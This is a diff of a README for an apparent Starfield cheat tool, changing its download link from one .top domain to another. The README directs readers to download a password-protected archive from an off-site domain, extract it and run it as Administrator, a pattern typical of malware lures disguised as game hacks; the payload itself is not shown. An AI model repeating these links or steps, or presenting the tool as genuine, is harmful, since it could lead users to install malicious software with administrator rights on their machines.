@@ -6,7 +6,7 @@ Starfield hack with god mode, infinite ammo, credits editor, ship unlocker, and 
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -70,7 +70,7 @@ Based on popular mods like **Starfield Engine Fixes** and **SFSE**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Starfield.
 4. Run the hack **as Administrator**.
